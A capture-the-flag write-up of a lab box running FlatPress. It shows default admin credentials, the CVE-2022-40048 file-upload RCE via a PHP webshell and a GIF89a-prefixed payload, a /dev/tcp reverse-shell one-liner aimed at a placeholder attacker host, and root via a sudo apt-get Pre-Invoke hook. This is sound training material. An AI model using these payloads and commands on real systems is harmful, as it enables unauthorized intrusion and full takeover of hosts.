
## Summary

Foothold is default credentials on FlatPress (a lightweight PHP blogging engine) admin login, followed by a known file-upload RCE (CVE-2022-40048) via the built-in Uploader feature. Used the White Winter Wolf PHP webshell rather than the reference PoC's GIF-polyglot payload, uploaded through Uploader, and located it directly at a predictable media path rather than routing through Media Manager. Privesc is a sudo misconfiguration on `apt-get`, abused via its pre-invoke hook option — a GTFOBins-documented technique.

**Chain:** default creds on FlatPress admin → Uploader file-upload RCE (CVE-2022-40048) → webshell at predictable path → reverse shell → sudo `apt-get` pre-invoke hook abuse → root

---

## Enumeration

### Nmap

```bash
nmap -Pn --open $IP
```

Only one open port, running a web service on a non-standard port (`8089` in this instance).

Browsing to it shows a **FlatPress** welcome page — a lightweight, easy-to-deploy PHP blogging engine.

**Pattern to remember:** with only one open port, the web app itself is the entire attack surface — no need to split attention across services, just enumerate the app thoroughly (version, admin panel, upload features, known CVEs).

---

## Exploitation

### Foothold: Default credentials

FlatPress admin login accepted default credentials:

```
admin:password
```

**Pattern to remember:** even lesser-known/niche CMS platforms are worth trying default creds against first — `admin:password` and `admin:admin` cost nothing and are frequently the actual "vulnerability" on these boxes.

### RCE: CVE-2022-40048 — Uploader file-upload RCE

FlatPress v1.2.1 has a known RCE in its Upload File functionality:

- CVE: [CVE-2022-40048](https://nvd.nist.gov/vuln/detail/CVE-2022-40048)
- Reference / issue tracker discussion: [flatpressblog/flatpress#152](https://github.com/flatpressblog/flatpress/issues/152)

The authenticated **Uploader** feature doesn't properly restrict uploaded file types, allowing a `.php` file to be placed on the server and later executed directly.

**What I did differently from the published PoC:**

- Instead of the GIF89a-header polyglot PHP file described in the public PoC, uploaded the **White Winter Wolf PHP webshell** through the Uploader feature.
- The uploaded file landed at a predictable, guessable path rather than needing to be located via the Media Manager UI:

```
http://$IP:8089/fp-content/attachs/webshell.php
```

- Accessed that path directly and used the webshell's own command-execution interface to trigger a reverse shell callback to my Kali listener, rather than embedding the reverse-shell one-liner inside the uploaded PHP file itself.

**Reference: the published PoC's approach** (documented for completeness, since it's a valid alternate method):

1. Log into `/login.php` with default creds.
2. Go to **Uploader**, create a PHP file with a GIF magic-byte prefix (to slip past naive file-type checks that only inspect the first bytes) containing an embedded reverse shell:

```php
GIF89a;
<?php
  system("echo <base64_payload> | base64 -d | bash");
?>
```

Payload generation:

```bash
echo "sh -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" | base64 -w 0
```

3. Upload it, then navigate to **Media Manager** and click the uploaded file to trigger execution (rather than knowing/guessing the direct path).

**Pattern to remember:** two valid execution paths on this exact bug — (a) know or guess the predictable upload directory and hit the file directly, or (b) use the app's own Media Manager UI to trigger it if the path isn't obvious. Also worth remembering the **GIF89a magic-byte prefix trick** generally: it's a classic bypass for upload filters that only check the first few bytes of a file to confirm it's an "image," while still leaving valid executable PHP later in the same file for the interpreter to run.

### Landing a shell

Set up a listener and triggered the shell via the webshell interface:

```bash
rlwrap nc -lvnp 8081
```

Landed a shell as `www-data`.

---

## Privilege Escalation

### Enumerate sudo rights

```bash
sudo -l
```

```
User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

`www-data` can run `apt-get` as root, no password.

### Abusing `apt-get`'s pre-invoke hook

`apt-get` supports arbitrary shell commands via its `-o` option overrides — specifically `APT::Update::Pre-Invoke`, a hook meant for legitimate pre-update scripting, but which runs whatever command it's set to, as whatever user invokes `apt-get`.

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

This spawns a root shell before the (irrelevant) `update` operation even runs.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

This is a documented [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/) technique — worth checking GTFOBins by binary name any time `sudo -l` shows something other than an obviously custom script.

**Pattern to remember:** package managers (`apt`, `apt-get`, `dpkg`, `yum`, `dnf`) frequently support pre/post-invoke hooks or plugin/config override options intended for legitimate automation — and those same options are almost always abusable for arbitrary command execution if the binary itself can be run as root via sudo. Always check GTFOBins for any binary appearing in `sudo -l`, especially ones that seem "boring" like a package manager — they're very often listed with a working technique.

---

## Lessons / Transferable Techniques

1. **Default creds on niche/lesser-known CMS platforms are still worth trying first**, same as major ones.
2. **File-upload RCEs often have multiple valid execution paths** — a predictable/guessable storage directory vs. the app's own UI to trigger the file. If one doesn't pan out, try the other.
3. **The GIF89a magic-byte prefix trick** is a reusable bypass pattern for naive "is this an image" upload filters — keep it in the toolkit alongside other polyglot file tricks.
4. **Any binary in `sudo -l`, however mundane it looks (package managers included), gets checked against GTFOBins before doing anything else.** Pre/post-invoke hooks in package managers are a recurring privesc pattern.
